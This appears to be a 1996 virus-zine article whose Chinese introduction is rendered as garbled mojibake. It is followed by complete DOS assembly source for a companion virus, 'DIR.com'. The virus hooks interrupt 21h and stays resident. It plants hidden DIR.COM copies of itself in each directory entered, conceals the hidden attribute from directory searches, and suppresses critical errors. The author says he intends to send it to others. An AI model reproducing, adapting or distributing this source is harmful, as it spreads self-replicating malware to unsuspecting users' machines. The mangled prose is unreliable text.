

        OvelOvelOvelOvelOvelOvelOvelOvelOvelOvelOvelOvelOvelOvelOvelOvel
        v                                                              v
        e       »OÆW«Â¤O¯f¬r¬ã¨s²ÕÂ´ ²Ä ‘D ´Á Âø»x      P.002          e
        l       [¯f¬r]                                                 l
        O                                                              O
        v       DIR ·|¤£·|¨Ï¹q¸£¤¤¬r?                   Zhugh Jin      v
        e       E-Mail: None                                           e
        l                                                              l
        OvelOvelOvelOvelOvelOvelOvelOvelOvelOvelOvelOvelOvelOvelOvelOvel

        (Dark Killer »¡©ú: ª÷ÂÍ¦b§ë½Z®É TPVO ©|¥¼§ï²Õ¬° OVEL,TP , ¦]¦¹³o
                           °¦¬r©Ò¥Îªº Mark ¤´¬° TPVO...)

        ¶Ù! ¦U¦ì!
        ©ñ°²¬O¤@¥ó«D±`²nªº¤é¤l! You know ? ¤£! §A­Ì¬O¤£¯à¤F¸Ñªº
        °Õ!

        ¸Ü»¡°Õ... ¬Y¤Ñ§Ú¦b°¨¤½¥«ªº¹qª±©±¸Ì¶¢®Ì...©±¸Ì­± 20 ´X³¡
        ªº¹q¸£, ©Ò¥Îªº¨t²Î¬O DOS/V 6.22 ! ¸Ì­±ªº games ³£¬O¯}¸Ñ
        ª©«¨... (¼K! ¸Ó¦ºªº³Ã¥ë! ¤Ñ·N­n¥L­Ì®â¦b§Ú¤â¸Ì! ¼H!)  ¦ý
        ¸Ì­±ªº dos «ü¥O³£³Q§ï±¼¤F, ¦p: dir -> di_¡Bcopy -> cop_
        ®`§Ú·d¤F¥b¤Ñ dos ¤@ª½µ¹§Ú Bad command or filename ³o­Ó
        °T®§... so... §Ú¡y³¾¡z¤j¤F... ·F­Ó masm ¦b¸Ì­±¤j·d¯S·d,
        ´N·d¥X³o­Óª±·N¤F... ¶â! ¼H... §ï¤Ñ°e°¦¬rµ¹³s¤Wªºª¯©x,ª±
        ¦º¥L­Ì... ¨þ... ;)

        ³o°¦¬r°ò¥»¤W¬O¤@°¦¦ñÀH«¬¯f¬r! ¥H©¹ªº¦ñÀH«¬¯f¬r¤j³£¬O±N
        .exe ¦A«Ø­Ó¦PÀÉ¦Wªº .com ÀÉ... ¥i¬O§Ú¦pªG±N command.com
        ¤¤ªº dir §ï¦¨ di_ ! µM«á¦A±N¥Ø¿ý¸ÌÂÃ­Ó dir.com ªºÁôÂÃÀÉ
        , ¦p¦¹¤@¨Ó´N¥i¥H¹F¦¨§Ú·Q­n°µªº¨Æ°Õ! ¼K!

        ªþ±a¤@´£ªº¬O, ¥H©¹§Ú­Ì²zª½®ð§§ªº»¡ "¤U dir «ü¥O¤£·|¤¤¬r!
        " ¦p¤µ¥i­n¦n¦n²`«äÅo... ;)

                                                       Zhuge Jin

;=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
;       This is [DIR.com] virus TPVO
;   by Golden Cicada at Makung, 1996.
;=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

        .286
        .model tiny
        .code

        org 0000h

vir_start:

;::::::::::::::::::::::::::::
;: ¿y§ï command.com ªº³¡¥÷ ::
;: (¬Ù²¤)±N command.com ¤¤ ::
;: ªº dir §ï¦¨ di_ !       ::
;::::::::::::::::::::::::::::

        mov si,0100h

        xor bx,bx
        mov ds,bx

        mov bl,21h*04h

        mov ax,OFFSET vint21h+0100h
        xchg ax,ds:[bx]
        mov cs:[si+OFFSET oint21h_ip],ax
        mov ax,cs
        xchg ax,ds:[bx+02h]
        mov cs:[si+OFFSET oint21h_cs],ax

        cli
        mov sp,OFFSET vir_end+0100h
        sti

        mov ah,4ah
        mov bx,OFFSET vir_end+0110h
        shr bx,04h
        int 21h

        push cs
        pop ds

        mov si,0080h
        lodsb
        cbw
        mov cx,ax
        add al,04h
        mov ds:cl1+0100h,al
        mov di,OFFSET cl2+0100h
        cld
        repz movsb

        mov si,OFFSET cl1+0100h
        int 2eh

        mov ax,cs
        dec ax
        mov es,ax

        mov cx,0007h
        mov di,0008h
        mov si,OFFSET pro_name+0100h
        repz movsb

        xor ax,ax
        stosb

        push cs
        pop es

        mov dx,OFFSET vir_end+0100h
        int 27h

stealth1:
        push bx

        mov bx,dx
        cmp byte ptr ds:[bx],0ffh
        jnz stealth_noex

        test byte ptr ds:[bx+06h],02h
        jz stealth_noex

        xor byte ptr ds:[bx+06h],02h

stealth_noex:
        pop bx

        jmp short dos_int21h

stealth2:
        test cl,02h
        jz stealth_ext

        xor cl,02h

stealth_ext:
        jmp short dos_int21h

vint21h:
        pushf

        cmp ah,11h
        jz stealth1

        cmp ah,4eh
        jz stealth2

        cmp ah,3bh
        jz infect

dos_int21h:
        popf
        jmp dword ptr cs:[OFFSET oint21h_ip+0100h]

int21h:
        pushf
        call dword ptr cs:[OFFSET oint21h_ip+0100h]
        ret

infect:
        push ax
        push bx
        push cx
        push dx
        push di
        push si
        push ds
        push es

        xor bx,bx
        mov es,bx

        push word ptr es:[bx+24h*04h]
        push word ptr es:[bx+24h*04h+02h]

        push bx
        push es

        mov word ptr es:[bx+24h*04h],OFFSET vint24h+0100h
        mov word ptr es:[bx+24h*04h+02h],cs

        push cs
        pop es

        mov di,OFFSET buffer+0100h
        mov si,dx

        mov ah,60h
        call int21h
        jc vint21h_ext

        cld
find_zero:
        cmp byte ptr es:[di],00h
        jz fz_a1
        inc di
        jmp find_zero
fz_a1:
        mov al,'\'
        cmp byte ptr es:[di-01h],al
        jz fz_a2
        stosb
fz_a2:

        push cs
        pop ds

        mov si,OFFSET vir_name+0100h
        mov cx,0008h
        repz movsb

        mov ah,5bh
        mov cx,0002h
        mov dx,OFFSET buffer+0100h
        call int21h
        jc vint21h_ext

        push cs
        pop ds

        xchg bx,ax
        mov ah,40h
        mov cx,OFFSET vir_end-OFFSET vir_start
        mov dx,OFFSET vir_start+0100h
        call int21h

        mov ah,3eh
        call int21h

vint21h_ext:
        pop es
        pop bx

        pop word ptr es:[bx+24h*04h+02h]
        pop word ptr es:[bx+24h*04h]

        pop es
        pop ds
        pop si
        pop di
        pop dx
        pop cx
        pop bx
        pop ax
        jmp dos_int21h

vint24h:
        xor al,al
        iret

oint21h_ip dw ?
oint21h_cs dw ?

pro_name db 'COMMAND'
vir_name db 'DIR.COM',00h

cl1 db 03h,'VER '
cl2 db 0dh

buffer  db 0100h dup(?)

vir_end:

        end vir_start

